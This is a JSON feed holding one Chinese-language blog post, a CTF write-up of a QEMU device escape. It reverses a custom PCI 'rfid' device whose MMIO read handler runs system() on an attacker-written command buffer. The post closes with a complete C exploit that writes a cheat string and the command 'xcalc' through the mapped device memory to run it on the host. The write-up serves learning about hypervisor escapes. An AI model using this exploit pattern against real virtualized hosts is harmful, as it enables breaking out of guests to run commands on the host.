{
    "version": "https://jsonfeed.org/version/1",
    "title": "Squirre17 Blog • All posts by \"virtualization\" tag",
    "description": "萌豚即是正义",
    "home_page_url": "https://Squirre17.github.io",
    "items": [
        {
            "id": "https://squirre17.github.io/2022/09/16/a-easy-virtualization-challenge/",
            "url": "https://squirre17.github.io/2022/09/16/a-easy-virtualization-challenge/",
            "title": "a-easy-virtualization-challenge",
            "date_published": "2022-09-16T02:43:40.000Z",
            "content_html": "<figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">__int64 __fastcall <span class=\"title function_\">sub_5713A8</span><span class=\"params\">(__int64 a1)</span></span><br><span class=\"line\">&#123;</span><br><span class=\"line\">  __int64 result; <span class=\"comment\">// rax</span></span><br><span class=\"line\"></span><br><span class=\"line\">  result = sub_70031D(a1, <span class=\"string\">&quot;pci-device&quot;</span>, <span class=\"string\">&quot;/home/wang/qemu/hw/misc/myrfid.c&quot;</span>, <span class=\"number\">369LL</span>, <span class=\"string\">&quot;rfid_class_init&quot;</span>);</span><br><span class=\"line\">  *(_QWORD *)(result + <span class=\"number\">176</span>) = qxl_reset_handler;</span><br><span class=\"line\">  *(_QWORD *)(result + <span class=\"number\">184</span>) = <span class=\"number\">0LL</span>;</span><br><span class=\"line\">  *(_WORD *)(result + <span class=\"number\">208</span>) = <span class=\"number\">0x420</span>;          [<span class=\"number\">1</span>] &lt;&lt;- vendor_id</span><br><span class=\"line\">  *(_WORD *)(result + <span class=\"number\">210</span>) = <span class=\"number\">0x1337</span>;         [<span class=\"number\">2</span>] &lt;&lt;- device_id</span><br><span class=\"line\">  *(_BYTE *)(result + <span class=\"number\">212</span>) = <span class=\"number\">0x69</span>;</span><br><span class=\"line\">  *(_WORD *)(result + <span class=\"number\">214</span>) = <span class=\"number\">0xFF</span>;</span><br><span class=\"line\">  <span class=\"keyword\">return</span> result;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<p>这个和源码对应关系如下</p>\n<figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"type\">static</span> <span class=\"type\">void</span> <span class=\"title function_\">qxl_pci_class_init</span><span class=\"params\">(ObjectClass *klass, <span class=\"type\">void</span> *data)</span></span><br><span class=\"line\">&#123;</span><br><span class=\"line\">    DeviceClass *dc = DEVICE_CLASS(klass);</span><br><span class=\"line\">    PCIDeviceClass *k = PCI_DEVICE_CLASS(klass);</span><br><span class=\"line\"></span><br><span class=\"line\">    k-&gt;vendor_id = REDHAT_PCI_VENDOR_ID;</span><br><span class=\"line\">    k-&gt;device_id = QXL_DEVICE_ID_STABLE;</span><br><span class=\"line\">    set_bit(DEVICE_CATEGORY_DISPLAY, dc-&gt;categories);</span><br><span class=\"line\">    dc-&gt;reset = qxl_reset_handler;</span><br><span class=\"line\">    dc-&gt;vmsd = &amp;qxl_vmstate;</span><br><span class=\"line\">    device_class_set_props(dc, qxl_properties);</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<p>凭借着厂商 id 和设备 id 就能找到总线上的位置<br>\n登入进去看到总线</p>\n<figure class=\"highlight shell\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta prompt_\"># </span><span class=\"language-bash\">lspci -nvv</span></span><br><span class=\"line\">00:00.0 Class 0600: 8086:1237</span><br><span class=\"line\">00:01.3 Class 0680: 8086:7113</span><br><span class=\"line\">00:03.0 Class 0200: 8086:100e</span><br><span class=\"line\">00:01.1 Class 0101: 8086:7010</span><br><span class=\"line\">00:02.0 Class 0300: 1234:1111</span><br><span class=\"line\">00:01.0 Class 0601: 8086:7000</span><br><span class=\"line\">00:04.0 Class 00ff: 0420:1337                 [1] &lt;&lt;- 是这个b</span><br></pre></td></tr></table></figure>\n<p>然后可以看到内存中的位置✨TODO</p>\n<figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\"># cat /sys/devices/pci0000\\:00/0000:00:04.0/resource</span></span><br><span class=\"line\"><span class=\"number\">0x00000000fb000000</span> <span class=\"number\">0x00000000fbffffff</span> <span class=\"number\">0x0000000000040200</span></span><br><span class=\"line\"><span class=\"number\">0x0000000000000000</span> <span class=\"number\">0x0000000000000000</span> <span class=\"number\">0x0000000000000000</span></span><br><span class=\"line\"><span class=\"number\">0x0000000000000000</span> <span class=\"number\">0x0000000000000000</span> <span class=\"number\">0x0000000000000000</span></span><br><span class=\"line\"><span class=\"number\">0x0000000000000000</span> <span class=\"number\">0x0000000000000000</span> <span class=\"number\">0x0000000000000000</span></span><br><span class=\"line\"><span class=\"number\">0x0000000000000000</span> <span class=\"number\">0x0000000000000000</span> <span class=\"number\">0x0000000000000000</span></span><br><span class=\"line\">起始地址            终止地址             长度</span><br></pre></td></tr></table></figure>\n<p>注意<br>\n source 是给用户看的 而 resource0~10 之类的是给我们 open 的<br>\n source 就是整合了这些的表格</p>\n<p>从 handler 跟下去<br>\n发现有一处调用了函数数组</p>\n<figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"type\">unsigned</span> __int64 __fastcall <span class=\"title function_\">sub_571043</span><span class=\"params\">(__int64 a1, __int64 a2)</span></span><br><span class=\"line\">&#123;</span><br><span class=\"line\">  <span class=\"type\">unsigned</span> __int64 v3; <span class=\"comment\">// [rsp+38h] [rbp-8h]</span></span><br><span class=\"line\"></span><br><span class=\"line\">  v3 = __readfsqword(<span class=\"number\">0x28</span>u);</span><br><span class=\"line\">  sub_570742(*(_QWORD *)(a1 + <span class=\"number\">120</span>), <span class=\"number\">1LL</span>);</span><br><span class=\"line\">  <span class=\"keyword\">if</span> ( !(<span class=\"type\">unsigned</span> <span class=\"type\">int</span>)sub_5C950D(a1, <span class=\"number\">0LL</span>, <span class=\"number\">1LL</span>, <span class=\"number\">1LL</span>, <span class=\"number\">0LL</span>, a2) )</span><br><span class=\"line\">  &#123;</span><br><span class=\"line\">    sub_570635(a1 + <span class=\"number\">2688</span>, <span class=\"number\">1LL</span>, sub_570A2E, a1);</span><br><span class=\"line\">    sub_843CE1(a1 + <span class=\"number\">2520</span>);</span><br><span class=\"line\">    sub_843FBD(a1 + <span class=\"number\">2576</span>);</span><br><span class=\"line\">    sub_8449B4(a1 + <span class=\"number\">2512</span>, <span class=\"string\">&quot;rfid&quot;</span>, sub_570E7C, a1, <span class=\"number\">0LL</span>);</span><br><span class=\"line\">    sub_31B892(a1 + <span class=\"number\">2272</span>, a1, func_array, a1, <span class=\"string\">&quot;rfid-mmio&quot;</span>, &amp;off_1000000);  [<span class=\"number\">1</span>] &lt;&lt;- vuln</span><br><span class=\"line\">    <span class=\"title function_\">sub_5C1EF2</span><span class=\"params\">(a1, <span class=\"number\">0LL</span>, <span class=\"number\">0LL</span>, a1 + <span class=\"number\">2272</span>)</span>;</span><br><span class=\"line\">  &#125;</span><br><span class=\"line\">  <span class=\"keyword\">return</span> __readfsqword(<span class=\"number\">0x28</span>u) ^ v3;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<p>函数数组如下</p>\n<figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">.data.rel.ro:<span class=\"number\">0000000000F</span>E9720 func_array      dq offset vuln          ; DATA XREF: qxl_reset_handler+<span class=\"number\">111</span>↑o</span><br><span class=\"line\">.data.rel.ro:<span class=\"number\">0000000000F</span>E9728                 dq offset sub_570CEB</span><br></pre></td></tr></table></figure>\n<p>其实这就是个 op 表 里面放的是 read write 之类的<br>\n源码如下</p>\n<figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"type\">static</span> <span class=\"type\">const</span> MemoryRegionOps qxl_io_ops = &#123;</span><br><span class=\"line\">    .read = ioport_read,</span><br><span class=\"line\">    .write = ioport_write,</span><br><span class=\"line\">    .valid = &#123;</span><br><span class=\"line\">        .min_access_size = <span class=\"number\">1</span>,</span><br><span class=\"line\">        .max_access_size = <span class=\"number\">1</span>,</span><br><span class=\"line\">    &#125;,</span><br><span class=\"line\">&#125;;</span><br></pre></td></tr></table></figure>\n<p>终于来到了漏洞函数<br>\n只要让这个变量 和他对应的秘籍相同即可</p>\n<figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">__int64 __fastcall <span class=\"title function_\">vuln</span><span class=\"params\">(__int64 a1, <span class=\"type\">unsigned</span> __int64 a2)</span></span><br><span class=\"line\">&#123;</span><br><span class=\"line\">  <span class=\"type\">size_t</span> v2; <span class=\"comment\">// rax</span></span><br><span class=\"line\"></span><br><span class=\"line\">  <span class=\"keyword\">if</span> ( ((a2 &gt;&gt; <span class=\"number\">20</span>) &amp; <span class=\"number\">0xF</span>) != <span class=\"number\">15</span> )</span><br><span class=\"line\">  &#123;</span><br><span class=\"line\">    v2 = <span class=\"built_in\">strlen</span>(cheats);</span><br><span class=\"line\">    <span class=\"keyword\">if</span> ( !<span class=\"built_in\">memcmp</span>(byte_122FFE0, cheats, v2) )</span><br><span class=\"line\">      system(command);</span><br><span class=\"line\">  &#125;</span><br><span class=\"line\">  <span class=\"keyword\">return</span> <span class=\"number\">270438LL</span>;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<p>根据这个变量可以往上 xref</p>\n<figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br><span class=\"line\">46</span><br><span class=\"line\">47</span><br><span class=\"line\">48</span><br><span class=\"line\">49</span><br><span class=\"line\">50</span><br><span class=\"line\">51</span><br><span class=\"line\">52</span><br><span class=\"line\">53</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">_BYTE *__fastcall <span class=\"title function_\">mmio_write</span><span class=\"params\">(__int64 a1, <span class=\"type\">unsigned</span> __int64 dst, __int64 src, <span class=\"type\">unsigned</span> <span class=\"type\">int</span> num)</span></span><br><span class=\"line\">&#123;</span><br><span class=\"line\">  _BYTE *result; <span class=\"comment\">// rax</span></span><br><span class=\"line\">  _DWORD n[<span class=\"number\">3</span>]; <span class=\"comment\">// [rsp+4h] [rbp-3Ch] BYREF</span></span><br><span class=\"line\">  <span class=\"type\">unsigned</span> __int64 v6; <span class=\"comment\">// [rsp+10h] [rbp-30h]</span></span><br><span class=\"line\">  __int64 v7; <span class=\"comment\">// [rsp+18h] [rbp-28h]</span></span><br><span class=\"line\">  <span class=\"type\">int</span> v8; <span class=\"comment\">// [rsp+2Ch] [rbp-14h]</span></span><br><span class=\"line\">  <span class=\"type\">int</span> idx; <span class=\"comment\">// [rsp+30h] [rbp-10h]</span></span><br><span class=\"line\">  <span class=\"type\">int</span> v10; <span class=\"comment\">// [rsp+34h] [rbp-Ch]</span></span><br><span class=\"line\">  __int64 v11; <span class=\"comment\">// [rsp+38h] [rbp-8h]</span></span><br><span class=\"line\"></span><br><span class=\"line\">  v7 = a1;</span><br><span class=\"line\">  v6 = dst;</span><br><span class=\"line\">  *(_QWORD *)&amp;n[<span class=\"number\">1</span>] = src;</span><br><span class=\"line\">  v11 = a1;</span><br><span class=\"line\">  v8 = (dst &gt;&gt; <span class=\"number\">20</span>) &amp; <span class=\"number\">0xF</span>;</span><br><span class=\"line\">  idx = (dst &gt;&gt; <span class=\"number\">16</span>) &amp; <span class=\"number\">0xF</span>;</span><br><span class=\"line\">  result = (_BYTE *)((dst &gt;&gt; <span class=\"number\">20</span>) &amp; <span class=\"number\">0xF</span>);</span><br><span class=\"line\">  <span class=\"keyword\">switch</span> ( (<span class=\"type\">unsigned</span> __int64)result )</span><br><span class=\"line\">  &#123;</span><br><span class=\"line\">    <span class=\"keyword\">case</span> <span class=\"number\">0uLL</span>:</span><br><span class=\"line\">      result = byteArray;</span><br><span class=\"line\">      byteArray[idx] = <span class=\"string\">&#x27;w&#x27;</span>;</span><br><span class=\"line\">      <span class=\"keyword\">break</span>;</span><br><span class=\"line\">    <span class=\"keyword\">case</span> <span class=\"number\">1uLL</span>:</span><br><span class=\"line\">      result = byteArray;</span><br><span class=\"line\">      byteArray[idx] = <span class=\"string\">&#x27;s&#x27;</span>;</span><br><span class=\"line\">      <span class=\"keyword\">break</span>;</span><br><span class=\"line\">    <span class=\"keyword\">case</span> <span class=\"number\">2uLL</span>:</span><br><span class=\"line\">      result = byteArray;</span><br><span class=\"line\">      byteArray[idx] = <span class=\"string\">&#x27;a&#x27;</span>;</span><br><span class=\"line\">      <span class=\"keyword\">break</span>;</span><br><span class=\"line\">    <span class=\"keyword\">case</span> <span class=\"number\">3uLL</span>:</span><br><span class=\"line\">      result = byteArray;</span><br><span class=\"line\">      byteArray[idx] = <span class=\"string\">&#x27;d&#x27;</span>;</span><br><span class=\"line\">      <span class=\"keyword\">break</span>;</span><br><span class=\"line\">    <span class=\"keyword\">case</span> <span class=\"number\">4uLL</span>:</span><br><span class=\"line\">      result = byteArray;</span><br><span class=\"line\">      byteArray[idx] = <span class=\"string\">&#x27;A&#x27;</span>;</span><br><span class=\"line\">      <span class=\"keyword\">break</span>;</span><br><span class=\"line\">    <span class=\"keyword\">case</span> <span class=\"number\">5uLL</span>:</span><br><span class=\"line\">      result = byteArray;</span><br><span class=\"line\">      byteArray[idx] = <span class=\"string\">&#x27;B&#x27;</span>;</span><br><span class=\"line\">      <span class=\"keyword\">break</span>;</span><br><span class=\"line\">    <span class=\"keyword\">case</span> <span class=\"number\">6uLL</span>:</span><br><span class=\"line\">      v10 = (<span class=\"type\">unsigned</span> __int16)v6;</span><br><span class=\"line\">      result = <span class=\"built_in\">memcpy</span>(&amp;command[(<span class=\"type\">unsigned</span> __int16)v6], &amp;n[<span class=\"number\">1</span>], num);</span><br><span class=\"line\">      <span class=\"keyword\">break</span>;</span><br><span class=\"line\">    <span class=\"keyword\">default</span>:</span><br><span class=\"line\">      <span class=\"keyword\">return</span> result;</span><br><span class=\"line\">  &#125;</span><br><span class=\"line\">  <span class=\"keyword\">return</span> result;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<p>这正是函数数组的第二个成员</p>\n<figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">.data.rel.ro:<span class=\"number\">0000000000F</span>E9720 func_array      dq offset mmio_read     ; DATA XREF: qxl_reset_handler+<span class=\"number\">111</span>↑o</span><br><span class=\"line\">.data.rel.ro:<span class=\"number\">0000000000F</span>E9728                 dq offset mmio_write</span><br></pre></td></tr></table></figure>\n<p>我们只需要往 cmd 里写入命令<br>\n然后写入秘籍<br>\n read 的时候就能命令执行了</p>\n<figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br><span class=\"line\">46</span><br><span class=\"line\">47</span><br><span class=\"line\">48</span><br><span class=\"line\">49</span><br><span class=\"line\">50</span><br><span class=\"line\">51</span><br><span class=\"line\">52</span><br><span class=\"line\">53</span><br><span class=\"line\">54</span><br><span class=\"line\">55</span><br><span class=\"line\">56</span><br><span class=\"line\">57</span><br><span class=\"line\">58</span><br><span class=\"line\">59</span><br><span class=\"line\">60</span><br><span class=\"line\">61</span><br><span class=\"line\">62</span><br><span class=\"line\">63</span><br><span class=\"line\">64</span><br><span class=\"line\">65</span><br><span class=\"line\">66</span><br><span class=\"line\">67</span><br><span class=\"line\">68</span><br><span class=\"line\">69</span><br><span class=\"line\">70</span><br><span class=\"line\">71</span><br><span class=\"line\">72</span><br><span class=\"line\">73</span><br><span class=\"line\">74</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">#<span class=\"keyword\">include</span> <span class=\"string\">&lt;sys/io.h&gt;</span></span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"keyword\">include</span> <span class=\"string\">&lt;stdio.h&gt;</span></span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"keyword\">include</span> <span class=\"string\">&lt;string.h&gt;</span></span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"keyword\">include</span> <span class=\"string\">&lt;stdlib.h&gt;</span></span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"keyword\">include</span> <span class=\"string\">&lt;unistd.h&gt;</span></span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"keyword\">include</span> <span class=\"string\">&lt;sys/mman.h&gt;</span></span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"keyword\">include</span> <span class=\"string\">&lt;assert.h&gt;</span></span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"keyword\">include</span> <span class=\"string\">&lt;fcntl.h&gt;</span></span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"keyword\">include</span> <span class=\"string\">&lt;inttypes.h&gt;</span></span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"keyword\">include</span> <span class=\"string\">&lt;sys/types.h&gt;</span></span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"keyword\">include</span> <span class=\"string\">&quot;./head.h&quot;</span></span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"keyword\">include</span> <span class=\"string\">&lt;stdint.h&gt;</span></span></span><br><span class=\"line\"><span class=\"keyword\">typedef</span> <span class=\"type\">uint64_t</span> u64;</span><br><span class=\"line\"><span class=\"type\">unsigned</span> <span class=\"type\">char</span> *mmio_mem;</span><br><span class=\"line\"><span class=\"type\">void</span> <span class=\"title function_\">mmio_read</span><span class=\"params\">(u64 dst)</span>&#123;</span><br><span class=\"line\">  assert(dst + mmio_mem &gt; mmio_mem);</span><br><span class=\"line\">  u64 ret = *((u64 *)(mmio_mem + dst));</span><br><span class=\"line\">  Done(<span class=\"string\">&quot;mmio_read&quot;</span>);</span><br><span class=\"line\">  <span class=\"keyword\">return</span> ret;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"><span class=\"comment\">// qemu中并没有真的对qemu的的内存读写</span></span><br><span class=\"line\"><span class=\"comment\">// 作为参数传递给qemu的write</span></span><br><span class=\"line\"><span class=\"type\">void</span> <span class=\"title function_\">mmio_write</span><span class=\"params\">(u64 cho, u64 idx, <span class=\"type\">char</span> chr)</span>&#123;</span><br><span class=\"line\">  u64 dst = ((cho &amp; <span class=\"number\">0xf</span>) &lt;&lt; <span class=\"number\">20</span>);</span><br><span class=\"line\">  u64 val = <span class=\"number\">0</span>;</span><br><span class=\"line\">  dst |= ((idx &amp; <span class=\"number\">0xf</span>) &lt;&lt; <span class=\"number\">16</span>);</span><br><span class=\"line\">  Info(<span class=\"string\">&quot;dst is %d&quot;</span>, dst);</span><br><span class=\"line\">  <span class=\"keyword\">if</span>(cho == <span class=\"number\">6</span>)&#123;</span><br><span class=\"line\">    val = chr;</span><br><span class=\"line\">    dst = idx;</span><br><span class=\"line\">    dst |= ((cho &amp; <span class=\"number\">0xf</span>) &lt;&lt; <span class=\"number\">20</span>);</span><br><span class=\"line\">  &#125;</span><br><span class=\"line\">  *((u64 *)(mmio_mem + dst)) = val;</span><br><span class=\"line\">  Done(<span class=\"string\">&quot;mmio_write&quot;</span>);</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"type\">void</span> <span class=\"title function_\">write_cheats</span><span class=\"params\">()</span>&#123;</span><br><span class=\"line\">  <span class=\"comment\">// aWwssadadbaba </span></span><br><span class=\"line\">  mmio_write(<span class=\"number\">0</span>,<span class=\"number\">0</span>,<span class=\"number\">0</span>);</span><br><span class=\"line\">  mmio_write(<span class=\"number\">0</span>,<span class=\"number\">1</span>,<span class=\"number\">0</span>);</span><br><span class=\"line\">  mmio_write(<span class=\"number\">1</span>,<span class=\"number\">2</span>,<span class=\"number\">0</span>);</span><br><span class=\"line\">  mmio_write(<span class=\"number\">1</span>,<span class=\"number\">3</span>,<span class=\"number\">0</span>);</span><br><span class=\"line\">  mmio_write(<span class=\"number\">2</span>,<span class=\"number\">4</span>,<span class=\"number\">0</span>);</span><br><span class=\"line\">  mmio_write(<span class=\"number\">3</span>,<span class=\"number\">5</span>,<span class=\"number\">0</span>);</span><br><span class=\"line\">  mmio_write(<span class=\"number\">2</span>,<span class=\"number\">6</span>,<span class=\"number\">0</span>);</span><br><span class=\"line\">  mmio_write(<span class=\"number\">3</span>,<span class=\"number\">7</span>,<span class=\"number\">0</span>);</span><br><span class=\"line\">  mmio_write(<span class=\"number\">5</span>,<span class=\"number\">8</span>,<span class=\"number\">0</span>);</span><br><span class=\"line\">  mmio_write(<span class=\"number\">4</span>,<span class=\"number\">9</span>,<span class=\"number\">0</span>);</span><br><span class=\"line\">  mmio_write(<span class=\"number\">5</span>,<span class=\"number\">10</span>,<span class=\"number\">0</span>);</span><br><span class=\"line\">  mmio_write(<span class=\"number\">4</span>,<span class=\"number\">11</span>,<span class=\"number\">0</span>);</span><br><span class=\"line\">  Done(<span class=\"string\">&quot;write_cheats&quot;</span>);</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"><span class=\"type\">void</span> <span class=\"title function_\">write_cmd</span><span class=\"params\">(<span class=\"type\">char</span> *cmd)</span>&#123;</span><br><span class=\"line\">  <span class=\"keyword\">for</span>(<span class=\"type\">int</span> i = <span class=\"number\">0</span>; i &lt; <span class=\"built_in\">strlen</span>(cmd); i++)</span><br><span class=\"line\">    mmio_write(<span class=\"number\">6</span>, i, cmd[i]);</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"type\">int</span> <span class=\"title function_\">main</span><span class=\"params\">()</span>&#123;</span><br><span class=\"line\">  <span class=\"type\">int</span> mmio_fd = open(</span><br><span class=\"line\">    <span class=\"string\">&quot;/sys/devices/pci0000:00/0000:00:04.0/resource0&quot;</span>,</span><br><span class=\"line\">    O_RDWR | O_SYNC</span><br><span class=\"line\">  );</span><br><span class=\"line\">  mmio_mem = mmap(</span><br><span class=\"line\">    <span class=\"number\">0</span>, <span class=\"number\">0x1000000</span>,</span><br><span class=\"line\">    PROT_WRITE | PROT_READ,</span><br><span class=\"line\">    MAP_SHARED, mmio_fd, <span class=\"number\">0</span></span><br><span class=\"line\">  );</span><br><span class=\"line\">  <span class=\"keyword\">if</span>(mmio_mem == MAP_FAILED)</span><br><span class=\"line\">    Abort(<span class=\"string\">&quot;mmap&quot;</span>);</span><br><span class=\"line\">  Info(<span class=\"string\">&quot;mmio_mem is 0x%lx&quot;</span>, mmio_mem);</span><br><span class=\"line\">  write_cheats();</span><br><span class=\"line\">  write_cmd(<span class=\"string\">&quot;xcalc&quot;</span>);<span class=\"comment\">// gnome-calculator 也行</span></span><br><span class=\"line\">  mmio_read((<span class=\"number\">1</span> &lt;&lt; <span class=\"number\">20</span>));</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n",
            "tags": [
                "Linux",
                "virtualization"
            ]
        }
    ]
}